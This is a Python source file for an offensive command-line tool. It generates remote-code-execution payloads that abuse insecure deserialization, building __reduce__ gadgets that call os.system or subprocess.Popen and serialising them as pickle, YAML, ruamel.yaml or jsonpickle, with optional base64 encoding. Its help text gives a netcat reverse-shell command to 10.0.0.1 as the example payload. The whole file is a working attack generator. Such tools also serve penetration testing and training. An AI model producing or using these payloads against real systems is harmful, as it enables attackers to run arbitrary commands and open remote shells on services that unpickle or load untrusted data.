import pickle
import base64
import os
import sys
import argparse
import yaml
import jsonpickle
from ruamel.yaml import YAML
from io import StringIO
import subprocess
from colorama import init, Fore, Style

# Initialize colorama
init()

class GenSubprocessPopen:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return subprocess.Popen, (self.command,)

class GenOsSystem:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return os.system, (self.command,)

def represent_gen_os_system(dumper, data):
    return dumper.represent_mapping('!GenOsSystem', {'command': data.command})

def represent_gen_subprocess_popen(dumper, data):
    return dumper.represent_mapping('!GenSubprocessPopen', {'command': data.command})

class Payload:
    def __init__(self, command, base64_encode, os_type, method):
        self.command = command
        self.base64_encode = base64_encode
        self.os_type = os_type
        self.method = method
        self.prefix = '' if self.os_type == 'linux' else 'cmd.exe /c '
        self.full_command = self.prefix + self.command

    def generate_payload(self, serialization_method):
        if self.method == 'subprocess':
            gen_class = GenSubprocessPopen
        else:
            gen_class = GenOsSystem

        if serialization_method == 'pickle':
            payload = pickle.dumps(gen_class(tuple(self.full_command.split())))
        elif serialization_method == 'yaml':
            payload = yaml.dump(gen_class(tuple(self.full_command.split()))).encode()
        elif serialization_method == 'ruamel_yaml':
            ruamel_yaml = YAML()
            ruamel_yaml.representer.add_representer(GenOsSystem, represent_gen_os_system)
            ruamel_yaml.representer.add_representer(GenSubprocessPopen, represent_gen_subprocess_popen)
            stream = StringIO()
            ruamel_yaml.dump(gen_class(tuple(self.full_command.split())), stream)
            payload = stream.getvalue().encode()
        elif serialization_method == 'jsonpickle':
            payload = jsonpickle.encode(gen_class(tuple(self.full_command.split()))).encode()
        else:
            raise ValueError(f"Unsupported serialization method: {serialization_method}")

        return self.encode_payload(payload)

    def encode_payload(self, payload):
        return base64.b64encode(payload).decode('utf-8') if self.base64_encode else payload

    def save_payload_to_file(self, payload, filename):
        with open(filename, 'w') as file:
            file.write(payload)
        print(f"{Fore.GREEN}Payload saved to {filename}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(
        description="Generate encoded RCE payload for deserialization.",
        epilog=f"{Fore.CYAN}Example: python pickle_payload.py -p 'nc -nv 10.0.0.1 1337 -e /bin/bash' -o payload.txt --method subprocess{Style.RESET_ALL}"
    )
    parser.add_argument("command", help="The command to execute.")
    parser.add_argument("-p", "--pickle", action='store_true', help="Generate a Pickle payload.")
    parser.add_argument("-y", "--yaml", action='store_true', help="Generate a YAML payload.")
    parser.add_argument("-r", "--ruamel", action='store_true', help="Generate a ruamel.yaml payload.")
    parser.add_argument("-j", "--jsonpickle", action='store_true', help="Generate a JSONPickle payload.")
    parser.add_argument("-o", "--output", help="File to save the encoded payload.", default=None)
    parser.add_argument("-b", "--base64", action='store_true', help="Base64 encode the payload.")
    parser.add_argument("--os", choices=['linux', 'windows'], default='linux', help="Target operating system (linux/windows). Default is linux.")
    parser.add_argument("--method", choices=['subprocess', 'os.system'], default='os', help="Method to use for command execution (subprocess/os.system). Default is os.")

    args = parser.parse_args()
    payload_generator = Payload(args.command, args.base64, args.os, args.method)

    if args.pickle:
        print(f"{Fore.CYAN}Generating Pickle payload for command: {Fore.YELLOW}{args.command}{Style.RESET_ALL}")
        payload = payload_generator.generate_payload('pickle')
    elif args.yaml:
        print(f"{Fore.CYAN}Generating YAML payload for command: {Fore.YELLOW}{args.command}{Style.RESET_ALL}")
        payload = payload_generator.generate_payload('yaml')
    elif args.ruamel:
        print(f"{Fore.CYAN}Generating ruamel.yaml payload for command: {Fore.YELLOW}{args.command}{Style.RESET_ALL}")
        payload = payload_generator.generate_payload('ruamel_yaml')
    elif args.jsonpickle:
        print(f"{Fore.CYAN}Generating JSONPickle payload for command: {Fore.YELLOW}{args.command}{Style.RESET_ALL}")
        payload = payload_generator.generate_payload('jsonpickle')
    else:
        print(f"{Fore.RED}Please specify a payload type: --pickle, --yaml, --ruamel, or --jsonpickle{Style.RESET_ALL}")
        sys.exit(1)

    if args.base64:
        print(f"\n{Fore.GREEN}Generated Payload (Base64 Encoded):{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.GREEN}Generated Payload:{Style.RESET_ALL}")
    print(payload)
    
    if args.output:
        payload_generator.save_payload_to_file(payload, args.output)

if __name__ == "__main__":
    main()
